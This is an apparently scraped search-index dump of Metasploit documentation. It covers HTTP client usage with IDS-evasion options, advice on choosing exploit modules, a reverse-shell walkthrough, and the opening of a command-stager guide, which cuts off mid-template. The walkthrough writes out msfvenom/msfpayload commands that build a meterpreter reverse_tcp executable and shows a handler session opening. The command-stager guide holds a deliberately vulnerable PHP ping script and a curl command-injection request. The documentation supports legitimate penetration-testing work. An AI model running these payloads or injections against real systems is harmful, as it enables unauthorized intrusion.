    "content": "1 - Can I use vars_get and vars_post together? . Yes. When you supply a hash to vars_get, basically it means “put all this data in the query string”. When you supply a hash to vars_post, it means “put all this data in the body.” All of them will be in the same request. You do need to make sure you’re using send_request_cgi, of course. 2 - I can’t use vars_get or vars_post due to some weird reason, what to do? . Do mention about this problem in the code (as a comment). If you can’t use vars_post, you can try the data key instead, which will send your post data raw. Normally, the most common solution to get around vars_get is to leave your stuff in the uri key. msftidy will flag this, but only as an “Info” and not a warning, which means you should still pass msftidy anyway. If this is a common problem, we can always change msftidy. 3 - Do I need to manually do basic auth? . You do not need to manually do basic auth in your request, because HttpClient should automatically do that for you. All you have to do is set the username and password in the datastore options, and then the mixin will use that when the web server asks. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#other-common-questions",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#other-common-questions"
  },"216": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "References",
    "content": ". | How to send an HTTP request using Rex Proto Http Client | . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#references",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html#references"
  },"217": {
    "doc": "How to Send an HTTP Request Using HttpClient",
    "title": "How to Send an HTTP Request Using HttpClient",
    "content": "The HttpClient mixin can be included with an exploit module in order to facilitate easier HTTP communications with a target machine. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html"
  },"218": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "How to send an HTTP request using Rex::Proto::Http::Client",
    "content": "The Rex library (Ruby Extension Library) is the most fundamental piece of the Metasploit Framework architecture. Modules normally do not interact with Rex directly, instead they depend on the framework core and its mixins for better code sharing. If you are a Metasploit module developer, the lib/msf/core directory should be more than enough for most of your needs. If you are writing a module that speaks HTTP, then the Msf::Exploit::Remote::HttpClient mixin (which is found in lib/msf/core/exploit/http/client) is most likely the one you want. However, in some scenarios, you actually can’t use the HttpClient mixin. The most common is actually when writing a form-based login module using the LoginScanner API. If you find yourself in that situation, use Rex::Proto::Http::Client. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#how-to-send-an-http-request-using-rexprotohttpclient",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#how-to-send-an-http-request-using-rexprotohttpclient"
  },"219": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "Initializing Rex::Proto::Http::Client",
    "content": "The Rex::Proto::Http::Client initializer creates a new HTTP client instance, and the most important piece is this: . def initialize(host, port = 80, context = {}, ssl = nil, ssl_version = nil, proxies = nil, username = '', password = '') . As you can use, only the host argument is required, the rest are optional. But let’s go over all of them right quick: . | Argument name | Data type | Description | . | host | String | Target host IP | . | port | Fixnum | Target host port | . | context | Hash | Determines what is responsible for requesting that a socket can be created | . | ssl | Boolean | True to enable it | . | ssl_version | String | SSL2, SSL3, or TLS1 | . | proxies | String | Configure a proxy | . | username | String | Username for automatic authentication | . | password | String | Password for automatic authentication | . Code example of initialing Rex::Proto::Http::Client: . cli = Rex::Proto::Http::Client.new(rhost, rport, {}, true, 8181, proxies, 'username', 'password') . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#initializing-rexprotohttpclient",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#initializing-rexprotohttpclient"
  },"220": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "Making an HTTP request",
    "content": "Even though our main topic of this documentation is about Rex::Proto::Http::Client, it does not know how to make HTTP requests. Instead, Rex::Proto::Http::ClientRequest is actually the mother of all Metasploit’s HTTP requests. So how does Rex::Proto::Http::ClientRequest give birth to an HTTP request? Well, you see son, it all begins when Rex::Proto::Http::Client asks for one with either the #request_cgi or the #request_raw method. The difference is that if #request_cgi is used, the request is meant to be CGI compatible, and in most cases this is what you want. If #request_raw is used, technically it means less options, less CGI compatible. A raw HTTP request supports the following options: . | Option/key name | Data type | Description | . | query | String | Raw GET query string | . | data | String | Raw POST data string | . | uri | String | Raw URI string | . | ssl | Boolean | True to use https://, otherwise http:// | . | agent | String | User-Agent. Default is: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) | . | method | String | HTTP method | . | proto | String | Protocol | . | version | String | Version | . | vhost | String | Host header | . | port | Fixnum | Port for the host header | . | authorization | String | The authorization header | . | cookie | String | The cookie header | . | connection | String | The connection header | . | headers | Hash | A hash of custom headers. Safer than raw_headers | . | raw_headers | String | A string of raw headers | . | ctype | String | Content type | . An example of using #request_raw’s options: . # cli is a Rex::Proto::Http::Client object req = cli.request_raw({ 'uri' =&gt;'/test.php', 'method' =&gt; 'POST', 'data' =&gt; 'A=B' }) . #request_cgi inherits all the above, and more: . | Option/key name | Data type | Description | . | pad_get_params | Boolean | Enable padding for GET parameters | . | pad_get_params_count | Fixnum | Number of random GET parameters. You also need pad_get_params for this | . | vars_get | Hash | A hash of GET parameters | . | encode_params | Boolean | Enable URI encoding for GET or POST parameters | . | pad_post_params | Boolean | Enable padding for POST parameters | . | pad_post_params_count | Fixnum | Number of random POST parameters. You also need pad_post_params for this | . An example of using one of #request_cgi options: . # cli is a Rex::Proto::Http::Client object req = cli.request_cgi({ 'uri' =&gt;'/test.php', 'vars_get' =&gt; { 'param1' =&gt; 'value', 'param2' =&gt; 'value' } }) . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#making-an-http-request",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#making-an-http-request"
  },"221": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "Sending an HTTP request",
    "content": "Here are examples of how to actually speak to an HTTP server with either #request_cgi or #request_raw: . ** request_cgi . cli = Rex::Proto::Http::Client.new(rhost), cli.connect req = cli.request_cgi({'uri'=&gt;'/'}) res = cli.send_recv(req) cli.close . ** request_raw . cli = Rex::Proto::Http::Client.new(rhost), cli.connect req = cli.request_raw({'uri'=&gt;'/'}) res = cli.send_recv(req) cli.close . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#sending-an-http-request",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#sending-an-http-request"
  },"222": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "Configuring advanced options",
    "content": "Evasion Options . Rex::Proto::Http::Client also comes with its own collection of evasion options. You can set them either when you’re asking Rex::Proto::Http::ClientRequest to make the HTTP request, or you can set them with a #set_config method. The main difference is that if you are using #set_config, you should make these options user-configurable. | Option | Data type | Default | Known configurable option | . | encode_params | Boolean | true | N/A | . | encode | Boolean | false | N/A | . | uri_encode_mode | String | hex-normal | HTTP::uri_encode_mode | . | uri_encode_count | Fixnum | 1 | N/A | . | uri_full_url | Boolean | false | HTTP::uri_full_url | . | pad_method_uri_count | Fixnum | 1 | HTTP::pad_method_uri_count | . | pad_uri_version_count | Fixnum | 1 | HTTP::pad_uri_version_count | . | pad_method_uri_type | String | space | HTTP::pad_method_uri_type | . | pad_uri_version_type | String | space | HTTP::pad_uri_version_type | . | method_random_valid | Boolean | false | HTTP::method_random_valid | . | method_random_invalid | Boolean | false | HTTP::method_random_invalid | . | method_random_case | Boolean | false | HTTP::method_random_case | . | version_random_valid | Boolean | false | N/A | . | version_random_invalid | Boolean | false | N/A | . | version_random_case | Boolean | false | N/A | . | uri_dir_self_reference | Boolean | false | HTTP::uri_dir_self_reference | . | uri_dir_fake_relative | Boolean | false | HTTP::uri_dir_fake_relative | . | uri_use_backslashes | Boolean | false | HTTP::uri_use_backslashes | . | pad_fake_headers | Boolean | pad_fake_headers | HTTP::pad_fake_headers | . | pad_fake_headers_count | Fixnum | 16 | HTTP::pad_fake_headers_count | . | pad_get_params | Boolean | false | HTTP::pad_get_params | . | pad_get_params_count | Boolean | 8 | HTTP::pad_get_params_count | . | pad_post_params | Boolean | false | HTTP::pad_post_params | . | pad_post_params_count | Fixnum | 8 | HTTP::pad_post_params_count | . | uri_fake_end | Boolean | false | HTTP::uri_fake_end | . | uri_fake_params_start | Boolean | false | HTTP::uri_fake_params_start | . | header_folding | Boolean | false | HTTP::header_folding | . | chunked_size | Fixnum | 0 | N/A | . NTLM Options . HTTP authentication is automatic in Rex::Proto::Http::Client, and when it comes to the NTLM provider, it gets its own options. You MUST use the #set_config method to set them: . | Option | Data type | Default | Known configurable option | . | usentlm2_session | Boolean | true | NTLM::UseNTLM2_session | . | use_ntlmv2 | Boolean | true | NTLM::UseNTLMv2 | . | send_lm | Boolean | true | NTLM::SendLM | . | send_ntlm | Boolean | true | NTLM::SendNTLM | . | SendSPN | Boolean | true | NTLM::SendSPN | . | UseLMKey | Boolean | false | NTLM::UseLMKey | . | domain | String | WORKSTATION | DOMAIN | . | DigestAuthIIS | Boolean | true | DigestAuthIIS | . Note: “Known configuration options” means there is a datastore option for it from HttpClient. If you can’t use HttpClient, then you will have to consider register them yourself. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#configuring-advanced-options",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#configuring-advanced-options"
  },"223": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "URI Parsing",
    "content": "Rex::Proto::Http::Client actually does not support URI parsing, so for URI format validation and normalization, you are on your own, and you should probably do it. For URI format validation, we recommend using Ruby’s URI module. You can use HttpClient’s #target_uri method as an example. For URI normalization, we recommend HttpClient’s #normalize_uri method as an example. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#uri-parsing",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#uri-parsing"
  },"224": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "Full Example",
    "content": "cli = Rex::Proto::Http::Client.new(rhost, rport, {}, ssl, ssl_version, proxies, user, pass) cli.set_config( 'vhost' =&gt; vhost, 'agent' =&gt; datastore['UserAgent'], 'uri_encode_mode' =&gt; datastore['HTTP::uri_encode_mode'], 'uri_full_url' =&gt; datastore['HTTP::uri_full_url'], 'pad_method_uri_count' =&gt; datastore['HTTP::pad_method_uri_count'], 'pad_uri_version_count' =&gt; datastore['HTTP::pad_uri_version_count'], 'pad_method_uri_type' =&gt; datastore['HTTP::pad_method_uri_type'], 'pad_uri_version_type' =&gt; datastore['HTTP::pad_uri_version_type'], 'method_random_valid' =&gt; datastore['HTTP::method_random_valid'], 'method_random_invalid' =&gt; datastore['HTTP::method_random_invalid'], 'method_random_case' =&gt; datastore['HTTP::method_random_case'], 'uri_dir_self_reference' =&gt; datastore['HTTP::uri_dir_self_reference'], 'uri_dir_fake_relative' =&gt; datastore['HTTP::uri_dir_fake_relative'], 'uri_use_backslashes' =&gt; datastore['HTTP::uri_use_backslashes'], 'pad_fake_headers' =&gt; datastore['HTTP::pad_fake_headers'], 'pad_fake_headers_count' =&gt; datastore['HTTP::pad_fake_headers_count'], 'pad_get_params' =&gt; datastore['HTTP::pad_get_params'], 'pad_get_params_count' =&gt; datastore['HTTP::pad_get_params_count'], 'pad_post_params' =&gt; datastore['HTTP::pad_post_params'], 'pad_post_params_count' =&gt; datastore['HTTP::pad_post_params_count'], 'uri_fake_end' =&gt; datastore['HTTP::uri_fake_end'], 'uri_fake_params_start' =&gt; datastore['HTTP::uri_fake_params_start'], 'header_folding' =&gt; datastore['HTTP::header_folding'], 'usentlm2_session' =&gt; datastore['NTLM::UseNTLM2_session'], 'use_ntlmv2' =&gt; datastore['NTLM::UseNTLMv2'], 'send_lm' =&gt; datastore['NTLM::SendLM'], 'send_ntlm' =&gt; datastore['NTLM::SendNTLM'], 'SendSPN' =&gt; datastore['NTLM::SendSPN'], 'UseLMKey' =&gt; datastore['NTLM::UseLMKey'], 'domain' =&gt; datastore['DOMAIN'], 'DigestAuthIIS' =&gt; datastore['DigestAuthIIS'] ) cli.connect req = cli.request_cgi({'uri'=&gt;'/'}) res = cli.send_recv(req) cli.close . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#full-example",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html#full-example"
  },"225": {
    "doc": "How to send an HTTP request using Rex Proto Http Client",
    "title": "How to send an HTTP request using Rex Proto Http Client",
    "content": "Note: This documentation may need to be vetted. ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html"
  },"226": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "Loading a Metasploit module",
    "content": "Each Metasploit module comes with some metadata that explains what it’s about, and to see that you must load it first. An example: . msf &gt; use exploit/windows/smb/ms08_067_netapi . ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#loading-a-metasploit-module",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#loading-a-metasploit-module"
  },"227": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "Read the module description and references",
    "content": "This may sound surprising, but sometimes we get asked questions that are already explained in the module. You should always look for the following in the description or the references it provides before deciding whether it’s appropriate to use the exploit or not: . | What products and versions are vulnerable: This is the most basic thing you should know about a vulnerability. | What type of vulnerability and how it works: Basically, you are learning the exploit’s side-effects. For example, if you’re exploiting a memory corruption, if it fails due to whatever reason, you may crash the service. Even if it doesn’t, when you’re done with the shell and type “exit”, it’s still possible to crash it too. High level bugs are generally safer, but not 100%. For example, maybe it needs to modify a config file or install something that can cause the application to be broken, and may become permanent. | Which ones have been tested: When a module is developed, usually the exploit isn’t tested against every single setup if there are too many. Usually the developers will just try to test whatever they can get their hands on. So if your target isn’t mentioned here, keep in mind there is no guarantee it’s going to work 100%. The safest thing to do is to actually recreate the environment your target has, and test the exploit before hitting the real thing. | What conditions the server must meet in order to be exploitable: Quite often, a vulnerability requires multiple conditions to be exploitable. In some cases you can rely on the exploit’s check command, because when Metasploit flags something as vulnerable, it actually exploited the bug. For browser exploits using the BrowserExploitServer mixin, it will also check exploitable requirements before loading the exploit. But automation isn’t always there, so you should try to find this information before running that “exploit” command. Sometimes it’s just common sense, really. For example: a web application’s file upload feature might be abused to upload a web-based backdoor, and stuff like that usually requires the upload folder to be accessible for the user. If your target doesn’t meet the requirement(s), there is no point to try. | . You can use the info command to see the module’s description: . msf exploit(ms08_067_netapi) &gt; info . ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#read-the-module-description-and-references",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#read-the-module-description-and-references"
  },"228": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "Read the target list",
    "content": "Every Metasploit exploit has a target list. Basically this is a list of setups the developers have tested before making the exploit publicly available. If your target machine isn’t on the list, it’s better to assume the exploit has never been tested on that particular setup. If the exploit supports automatic targeting, it is always the first item on the list (or index 0). The first item is also almost always the default target. What this means is that you should never assume the exploit will automatically select a target for you if you’ve never used it before, and that the default setup might not be the one you’re testing against. The “show options” command will tell you which target is selected. For example: . msf exploit(ms08_067_netapi) &gt; show options . The “show targets” command will give you a list of targets supported: . msf exploit(ms08_067_netapi) &gt; show targets . ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#read-the-target-list",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#read-the-target-list"
  },"229": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "Check all the options",
    "content": "All Metasploit modules come with most datastore options pre-configured. However, they may not be suitable for the particular setup you’re testing. To do a quick double-check, usually the “show options” command is enough: . msf exploit(ms08_067_netapi) &gt; show options . However, “show options” only shows you all the basic options. It does not show you the evasive or advanced options (try “show evasion” and “show advanced”), the command you should use that shows you all the datastore options is actually the “set” command: . msf exploit(ms08_067_netapi) &gt; set . ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#check-all-the-options",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#check-all-the-options"
  },"230": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "Find the module’s pull request",
    "content": "The Metasploit repository is hosted on GitHub, and the developers/contributors rely on it heavily for development. Before a module is made public, it is submitted as a pull request for final testing and review. In there, you will find pretty much everything you need to know about the module, and probably things you won’t learn from reading the module’s description or some random blog post. The information is like gold, really. Things you might learn from reading a pull request: . | Steps on how to set up the vulnerable environment. | What targets were actually tested. | How the module is meant to be used. | How the module was verified. | What problems were identified. Problems you might want to know. | Demonstrations. | Other surprises. | . There are a few ways to find the pull request of the module you’re using: . | Via info -d in msfconsole: If you generate a personal access token and set it in your shell environment with export GITHUB_OAUTH_TOKEN your_token, the builtin documentation will show relevant pull requests for the current module. | Via the pull request number: If you actually know the pull request number, this is the easiest. Simply go: . | . https://github.com/rapid7/metasploit-framework/pull/[PULL REQUEST NUMBER HERE] . | Via filters: This is most likely how you find the pull request. First off, you should go here: https://github.com/rapid7/metasploit-framework/pulls. At the top, you will see a search input box with the default filters: is:pr is:open. These default ones mean you’re looking at pull requests, and you’re looking at the ones that are still pending - still waiting to be merged to Metasploit. Well, since you’re finding the one that’s already merged, you should do these: | . | Click on “Closed”. | Select label “module”. | In the search box, enter additional keywords related to the module. The module’s title probably provides the best keywords. | . Note: If the module was written before Nov 2011, you WILL NOT find the pull request for it. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#find-the-modules-pull-request",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html#find-the-modules-pull-request"
  },"231": {
    "doc": "How to use a Metasploit module appropriately",
    "title": "How to use a Metasploit module appropriately",
    "content": "As an user, one thing we love Metasploit the most is it allows something really technically difficult to understand or engineer into something really easy to use, literally within a few clicks away to make you look like Neo from the Matrix. It makes hacking super easy. However, if you’re new to Metasploit, know this: Nobody makes their first jump. You are expected to make mistakes, sometimes small, sometimes catastrophic… hopefully not. You’re very likely to fall on your face with your first exploit, just like Neo. Obviously, to become The One you must learn to use these modules appropriately, and we will teach you how. In this documentation, understand that we require you no exploit development knowledge. Some programming knowledge would be nice, of course. The whole point is that there is actually “homework” before using an exploit, and you should always do your homework. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html"
  },"232": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "On this page",
    "content": ". | List of Metasploit reverse shells . | Windows common reverse shell | Linux common reverse shell | . | When to use a reverse shell | When a reverse shell isn’t needed | How to set up for a reverse shell during payload generation | Demonstration . | Step 1: Generate the executable payload | Step 2: Copy the executable payload to box B | Step 3: Set up the payload handler on box A | Step 4: Double-click on the malicious executable | Step 5: View the meterpreter/payload session on box A | . | . There are two popular types of shells: bind and reverse. Bind shell - Opens up a new service on the target machine and requires the attacker to connect to it to get a session. Reverse shell - A reverse shell is also known as a connect-back. It requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally, the attacker receives the shell. You can learn more about the primary use of payloads in the 5.2.4 Selecting the Payload section of the old Metasploit Users Guide. This article goes over using a reverse shell to get a session. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#on-this-page",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#on-this-page"
  },"233": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "List of Metasploit reverse shells",
    "content": "To get a list of reverse shells, use the msfpayload command. B ./msfpayload -l |grep reverse . As a rule of thumb, always pick a Meterpreter, because it currently provides better support of the post-exploitation Metasploit has to offer. For example, railgun, post modules, different meterpreter commands. Windows common reverse shell . In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. You can also use windows/meterpreter/reverse_http or windows/meterpreter/reverse_https because their network traffic appears a little bit less abnormal. Linux common reverse shell . In Linux, you can try linux/x86/meterpreter/reverse_tcp, or the 64-bit one. The linux/x86/shell_reverse_tcp has been the most stable. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#list-of-metasploit-reverse-shells",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#list-of-metasploit-reverse-shells"
  },"234": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "When to use a reverse shell",
    "content": "If you find yourself in one of the following scenarios, then you should consider using a reverse shell: . | The target machine is behind a different private network. | The target machine’s firewall blocks incoming connection attempts to your bindshell. | Your payload is unable to bind to the port it wants due to whatever reason. | You can’t decide what to choose. | . ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#when-to-use-a-reverse-shell",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#when-to-use-a-reverse-shell"
  },"235": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "When a reverse shell isn’t needed",
    "content": "Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example, if the target machine is already running an SSH server, then you can try adding a new user to it and use that. If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP “web shell”. IIS servers usually support ASP or ASP.net. The Metasploit Framework offers payloads in all these languages and many others. This also applied to VNC, remote desktop, SMB (psexec), or other remote admin tools, etc. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#when-a-reverse-shell-isnt-needed",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#when-a-reverse-shell-isnt-needed"
  },"236": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "How to set up for a reverse shell during payload generation",
    "content": "When you generate a reverse shell with either msfpayload or msfvenom, you must know how to configure the following: . | LHOST - This is the IP address you want your target machine to connect to. If you’re in a local area network, it is unlikely your target machine can reach you unless you both are on the same network. In that case, you will have to find out your public-facing IP address, and then configure your network to port-forward that connection to your box. LHOST should not be “localhost”, or “0.0.0.0”, or “127.0.0.1”, because if you do, you’re telling the target machine to connect to itself (or it may not work at all). | LPORT - This the port you want your target machine to connect to. | . When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective): . | LHOST - This is the IP address you want your listener to bind to. | LPORT - This is the port you want your listener to bind to. | . You should make sure the listener has started first before executing the reverse shell. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#how-to-set-up-for-a-reverse-shell-during-payload-generation",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#how-to-set-up-for-a-reverse-shell-during-payload-generation"
  },"237": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "Demonstration",
    "content": "In this demonstration, we have two boxes: . Box A: . | The attacker’s box that receives the payload session | IP is: 192.168.1.123 (ifconfig) | On the same network as the victim machine | . Box B: . | The “victim” machine | Windows XP | IP is: 192.168.1.80 (ipconfig) | On the same network as the attacker machine | For testing purposes, no antivirus enabled. | For testing purposes, no firewall enabled, either. | . Step 1: Generate the executable payload . On the attacker’s box, run msfpayload or msfvenom: . $ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X &gt; /tmp/iambad.exe Created by msfpayload (http://www.metasploit.com). Payload: windows/meterpreter/reverse_tcp Length: 287 Options: {\"LHOST\"=&gt;\"192.168.1.123\", \"LPORT\"=&gt;\"4444\"} . Step 2: Copy the executable payload to box B . Box B is the victim machine. Step 3: Set up the payload handler on box A . Box A is the attacker machine. $ ./msfconsole -q msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.1.123 lhost =&gt; 192.168.1.123 msf exploit(handler) &gt; set lport 4444 lport =&gt; 4444 msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.123:4444 [*] Starting the payload handler... Step 4: Double-click on the malicious executable . This step requires no further explanation. Step 5: View the meterpreter/payload session on box A . $ ./msfconsole -q msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.1.123 lhost =&gt; 192.168.1.123 msf exploit(handler) &gt; set lport 4444 lport =&gt; 4444 msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.123:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 192.168.1.80 [*] Meterpreter session 1 opened (192.168.1.123:4444 -&gt; 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500 meterpreter &gt; . The meterpreter prompt means you are currently interacting with the payload. ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#demonstration",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html#demonstration"
  },"238": {
    "doc": "How to use a reverse shell in Metasploit",
    "title": "How to use a reverse shell in Metasploit",
    "content": " ",
    "url": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html"
  },"239": {
    "doc": "How to use command stagers",
    "title": "The Vulnerability Test Case",
    "content": "The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping: . &lt;?php if ( isset($_GET[\"ip\"]) ) { $output = system(\"ping -c 1 \" . $_GET[\"ip\"]); die($output); } ?&gt; &lt;html&gt; &lt;body&gt; &lt;form action = \"ping.php\" method = \"GET\"&gt; IP to ping: &lt;input type = \"text\" name = \"ip\" /&gt; &lt;input type = \"submit\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; . Place the above PHP script (ping.php) on an Ubuntu + Apache + PHP server. Make sure your Apache server isn’t exposed to the Internet! . Under normal usage, this is how the script behaves - it just pings the host you specify, and shows you the output: . $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms . OK, now we can abuse that a little and execute another command (id): . $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) . See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it. ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#the-vulnerability-test-case",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#the-vulnerability-test-case"
  },"240": {
    "doc": "How to use command stagers",
    "title": "The Msf::Exploit::CmdStager Mixin",
    "content": "Now let’s talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do: . 1. Include the Msf::Exploit::CmdStager mixin . Although there are many flavors of mixins/stagers, you only need to include Msf::Exploit::CmdStager when writing a Metasploit exploit. The mixin is basically an interface to all command stagers: . include Msf::Exploit::CmdStager . 2. Declare your flavors . To tell Msf::Exploit::CmdStager what flavors you want, you can add the CmdStagerFlavor info in the module’s metadata. Either from the common level, or the target level. Multiple flavors are allowed. An example of setting flavors for a specific target: . 'Targets' =&gt; [ [ 'Windows', { 'Arch' =&gt; [ ARCH_X86_64, ARCH_X86 ], 'Platform' =&gt; 'win', 'CmdStagerFlavor' =&gt; [ 'certutil', 'vbs' ] } ] ] . Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin). execute_cmdstager(flavor: :vbs) . However, it is best to set the compatible list of flavors in CmdStagerFlavor, rather than hard-coding the flavor in the execute_cmdstager method call, as this allows the operator to choose a flavor from msfconsole with set CmdStager::flavor . 3. Create the execute_command method . You also must create a def execute_command(cmd, opts = {}) method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the cmd variable to the vulnerable code. 4. Call #execute_cmdstager to begin . And lastly, in your exploit method, call execute_cmdstager to begin the command stager. Over the years, we have also learned that these options are quite handy when calling execute_cmdstager: . | flavor - You can specify what command stager (flavor) to use from here. | delay - How much time to delay between each command execution. 0.25 is default. | linemax - Maximum number of characters per command. 2047 is default. | . Msf::Exploit::CmdStager Template . At the minimum, this is how your exploit should start when you’re using the CmdStager mixin: . class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include 